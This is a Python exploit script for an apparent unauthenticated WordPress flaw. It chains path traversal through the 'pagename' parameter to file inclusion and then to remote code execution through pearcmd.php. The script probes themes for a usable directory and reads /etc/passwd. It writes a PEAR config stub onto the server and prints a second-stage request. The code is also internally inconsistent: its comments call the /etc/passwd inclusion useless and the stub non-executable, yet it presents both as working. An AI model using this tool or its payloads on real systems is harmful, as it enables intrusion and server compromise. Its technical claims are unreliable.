#!/usr/bin/env python3
"""
CVE-2026-87902 — WordPress Core LFI via locate_template()

Affected : WordPress <= 7.1.1 (unauthenticated)
Type     : Local File Inclusion → Remote Code Execution
CVSS     : 9.8 (Critical)

Root cause
----------
locate_template() resolves a caller-supplied template name against the active
theme directory using realpath() but never verifies the resolved path stays
inside that directory. get_page_template() feeds it a name built directly from
the URL query variable 'pagename' (url-decoded, not sanitized), so:

  GET /?pagename=templates/%2e%2e/%2e%2e/…/target

  → template name : page-templates/../../…/target.php
  → realpath()    : /absolute/path/to/target.php   ← arbitrary include

Requirements
------------
  (1) The active theme must contain a top-level directory whose name starts
      with 'page-' (e.g. page-templates in Twenty Twelve, Twenty Fourteen,
      Neve, Hestia, Sydney).  realpath() needs each path component to exist.
  (2) For RCE: a readable pearcmd.php with register_argc_argv = On
      (default in the official PHP Docker image and cPanel PHP < 8.5).

RCE chain (pearcmd trick)
-------------------------
When register_argc_argv=On, PHP maps the URL query string into $argv.
Including pearcmd.php via LFI therefore runs an arbitrary PEAR command:

  ?pagename=<lfi>&+config-create+/&/var/www/html/wp-content/uploads/shell.php

  → $argv = ['pearcmd.php', 'config-create', '/', '<write_path>']
  → PEAR writes a config stub to <write_path>
  → A second LFI inclusion of that stub achieves code execution
"""

import argparse
import sys
import urllib.parse
from typing import Optional

import requests

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

BANNER = """
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗  ██████╗ ██████╗ ███████╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗██╔════╝ ╚════██╗╚════██╗
██║     ██║   ██║█████╗       █████╔╝██║██╔██║███████╗  █████╔╝ █████╔╝
██║     ╚██╗ ██╔╝██╔══╝      ██╔══██╗████╔╝██║██╔═══██╗██╔══██╗██╔═══╝
╚██████╗ ╚████╔╝ ███████╗    ██████╔╝╚██████╔╝╚██████╔╝███████║███████╗
 ╚═════╝  ╚═══╝  ╚══════╝    ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝

  CVE-2026-87902  WordPress LFI via locate_template()  WordPress <= 7.1.1
  Unauthenticated · LFI → RCE (pearcmd + register_argc_argv=On)
"""

# Themes that ship with a top-level 'page-*' directory out of the box
THEME_PAGE_DIRS: dict[str, str] = {
    "twentytwelve":   "page-templates",
    "twentyfourteen": "page-templates",
    "neve":           "page-templates",
    "hestia":         "page-templates",
    "sydney":         "page-templates",
}

# pearcmd.php candidate paths (most common first)
PEARCMD_PATHS: list[str] = [
    "/usr/local/lib/php/pearcmd",   # PHP Docker image default
    "/usr/share/php/pearcmd",       # Debian / Ubuntu system PHP
    "/usr/lib/php/pearcmd",         # RHEL / CentOS
    "/usr/local/share/php/pearcmd", # FreeBSD ports
]

# Strings that confirm /etc/passwd was included
PASSWD_INDICATORS: list[str] = [
    "root:x:", "root:!", "daemon:", "nobody:", "/bin/bash", "/bin/sh",
    "/sbin/nologin", "/usr/sbin/nologin",
]


# ---------------------------------------------------------------------------
# Payload helpers
# ---------------------------------------------------------------------------

def build_lfi_payload(suffix: str, depth: int, target: str) -> str:
    """
    Build the 'pagename' query-parameter value that causes the LFI.

    suffix  – part of the theme's page-* dir after 'page-'
              e.g. 'templates' → theme contains 'page-templates/'
    depth   – number of ../ hops from the page-* dir to filesystem root
              (7 covers the typical /var/www/html/wp-content/themes/<name>/ layout)
    target  – absolute path to include, WITHOUT the trailing .php extension
              (locate_template appends '.php' automatically)

    Example
    -------
    build_lfi_payload('templates', 7, '/etc/passwd')
    → 'templates/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'

    WordPress constructs: page-templates/../../…/etc/passwd.php
    locate_template feeds it to realpath() → /etc/passwd.php  (not useful)

    For files that already end in .php we pass the path without the extension
    so WordPress appends it back:
    build_lfi_payload('templates', 7, '/usr/local/lib/php/pearcmd')
    → resolves to /usr/local/lib/php/pearcmd.php  ✓
    """
    hops = "/%2e%2e" * depth
    return f"{suffix}{hops}/{target.lstrip('/')}"


def strip_php(path: str) -> str:
    """Remove trailing .php so locate_template's auto-append works correctly."""
    return path[:-4] if path.endswith(".php") else path


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def make_session(ua: str = "Mozilla/5.0 (Security Research)") -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = ua
    return s


def probe_theme_dirs(base_url: str, session: requests.Session) -> Optional[str]:
    """
    Return the page-* directory suffix for the first matching theme, or None.
    Checks /wp-content/themes/<theme>/<page-dir>/ for HTTP 200 or 403.
    """
    for theme, page_dir in THEME_PAGE_DIRS.items():
        url = f"{base_url}/wp-content/themes/{theme}/{page_dir}/"
        try:
            r = session.get(url, timeout=8, allow_redirects=False)
            if r.status_code in (200, 403):
                suffix = page_dir[len("page-"):]
                print(f"[+] Vulnerable theme dir found: {page_dir}  (theme: {theme})")
                return suffix
        except requests.RequestException:
            pass
    return None


def request_lfi(base_url: str, pagename: str, session: requests.Session) -> Optional[requests.Response]:
    """Fire the LFI request; return the Response or None on network error."""
    try:
        return session.get(f"{base_url}/", params={"pagename": pagename}, timeout=15)
    except requests.RequestException as exc:
        print(f"[-] Request failed: {exc}")
        return None


def confirm_lfi(body: str) -> bool:
    """Return True when the response body contains /etc/passwd artefacts."""
    return any(ind in body for ind in PASSWD_INDICATORS)


# ---------------------------------------------------------------------------
# RCE via pearcmd.php
# ---------------------------------------------------------------------------

def attempt_pearcmd_rce(
    base_url: str,
    suffix: str,
    depth: int,
    write_path: str,
    session: requests.Session,
) -> Optional[str]:
    """
    Try each known pearcmd.php path.

    On success, writes a PEAR config stub to write_path and returns the
    pearcmd path that worked.  Returns None if all candidates fail.

    Mechanism
    ---------
    register_argc_argv=On causes PHP to split the raw query string on '+'
    and populate $argv with the resulting tokens.  PEAR's config-create
    command writes a serialised config file:

      GET /?pagename=<lfi>&+config-create+/&<write_path>
      $argv → ['pearcmd.php', 'config-create', '/', '<write_path>']
      PEAR  → writes stub to <write_path>

    The stub is not directly executable PHP, but it can be further processed
    (e.g. a second LFI that triggers a PHP error to leak the path, or
    overwriting a writable .php file in the webroot).
    """
    for pearcmd in PEARCMD_PATHS:
        payload = build_lfi_payload(suffix, depth, pearcmd)
        encoded_payload = urllib.parse.quote(payload, safe="/%")
        encoded_write = urllib.parse.quote(write_path, safe="")
        # Manually craft the URL so we control the raw query string layout
        raw_url = f"{base_url}/?pagename={encoded_payload}&+config-create+/&{encoded_write}"
        try:
            r = session.get(raw_url, timeout=15)
            # PEAR prints to stdout; a 200 with PEAR output is the success signal
            if r.status_code == 200 and (
                "PEAR" in r.text
                or "config" in r.text.lower()
                or "pear_config" in r.text.lower()
            ):
                return pearcmd + ".php"
        except requests.RequestException:
            pass
    return None


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="poc.py",
        description="CVE-2026-87902 — WordPress LFI via locate_template()",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # Auto-detect theme, verify LFI with /etc/passwd
  python3 poc.py http://target.local

  # Specify theme-dir suffix and traversal depth manually
  python3 poc.py http://target.local -t templates -d 7

  # Include a specific PHP file
  python3 poc.py http://target.local -f /var/log/nginx/access.log

  # Attempt RCE via pearcmd (requires register_argc_argv=On)
  python3 poc.py http://target.local --rce
  python3 poc.py http://target.local --rce --write-path /var/www/html/wp-content/uploads/x.php
""",
    )
    p.add_argument("url", help="Target WordPress base URL (e.g. http://target.local)")
    p.add_argument(
        "-t", "--theme-dir", metavar="SUFFIX",
        help="Suffix of the theme's page-* dir to use (e.g. 'templates' for "
             "'page-templates'). Auto-detected when omitted.",
    )
    p.add_argument(
        "-d", "--depth", type=int, default=7, metavar="N",
        help="Number of ../ hops from the page-* dir to the filesystem root "
             "(default: 7, suits /var/www/html/wp-content/themes/<name>/ layout).",
    )
    p.add_argument(
        "-f", "--file", metavar="PATH", default="/etc/passwd",
        help="Readable file to include for LFI verification (default: /etc/passwd). "
             "Must NOT end with .php — locate_template appends the extension.",
    )
    p.add_argument(
        "--rce", action="store_true",
        help="Attempt RCE via the pearcmd.php config-create trick "
             "(requires register_argc_argv=On).",
    )
    p.add_argument(
        "--write-path", metavar="PATH",
        default="/tmp/cve_2026_87902.php",
        help="Destination path for the pearcmd config stub "
             "(default: /tmp/cve_2026_87902.php).",
    )
    p.add_argument("-v", "--verbose", action="store_true", help="Print raw response body.")
    return p


def main() -> None:
    print(BANNER)
    args = build_arg_parser().parse_args()
    base_url = args.url.rstrip("/")
    session = make_session()

    # ── Step 1: resolve theme directory ────────────────────────────────────
    suffix = args.theme_dir
    if not suffix:
        print("[*] Probing for vulnerable theme page-* directories …")
        suffix = probe_theme_dirs(base_url, session)
        if not suffix:
            print("[-] Could not auto-detect a page-* directory.")
            print("    Specify one manually with -t <suffix>  (e.g. -t templates)")
            sys.exit(1)

    print(f"[*] page-* directory suffix : {suffix!r}  → page-{suffix}/")
    print(f"[*] Traversal depth         : {args.depth}")

    # ── Step 2: LFI check ──────────────────────────────────────────────────
    lfi_target = strip_php(args.file)
    payload = build_lfi_payload(suffix, args.depth, lfi_target)

    print(f"\n[*] LFI target file  : {args.file}")
    print(f"[*] pagename payload : {payload}")
    print(f"[*] Full request URL : {base_url}/?pagename={urllib.parse.quote(payload, safe='/%')}")

    resp = request_lfi(base_url, payload, session)
    if resp is None:
        sys.exit(1)

    print(f"[*] HTTP status      : {resp.status_code}")

    if args.verbose:
        print("\n── Response body (first 1 000 chars) ──")
        print(resp.text[:1000])
        print("───────────────────────────────────────\n")

    if resp.status_code == 200 and confirm_lfi(resp.text):
        print("\n[!!!] LFI CONFIRMED — /etc/passwd content detected in response")
        # Print the passwd lines that leaked
        for line in resp.text.splitlines():
            if ":" in line and not line.startswith("<") and len(line) < 150:
                print(f"      {line}")
    elif resp.status_code == 200:
        print("[?]  HTTP 200 received but could not confirm file inclusion.")
        print("     Try -v to inspect the response, or adjust --depth / --theme-dir.")
    else:
        print(f"[-]  LFI not triggered (HTTP {resp.status_code}).")
        print("     Adjust --depth or --theme-dir and retry.")

    # ── Step 3: optional RCE ───────────────────────────────────────────────
    if not args.rce:
        return

    print("\n[*] Attempting RCE via pearcmd.php …")
    print(f"[*] Config stub destination : {args.write_path}")

    worked = attempt_pearcmd_rce(base_url, suffix, args.depth, args.write_path, session)
    if worked:
        print(f"\n[+] pearcmd.php triggered via : {worked}")
        print(f"[+] PEAR config stub written  : {args.write_path}")
        stub_payload = build_lfi_payload(suffix, args.depth, strip_php(args.write_path))
        print(f"\n[*] Second-stage LFI to execute the stub:")
        print(f"    GET {base_url}/?pagename={urllib.parse.quote(stub_payload, safe='/%')}")
    else:
        print("[-] pearcmd RCE failed — all candidate paths exhausted.")
        print("    Requirements: register_argc_argv=On  AND  pearcmd.php readable by www-data")
        print("    Common setups: official PHP Docker image, cPanel with PHP < 8.5")


if __name__ == "__main__":
    main()
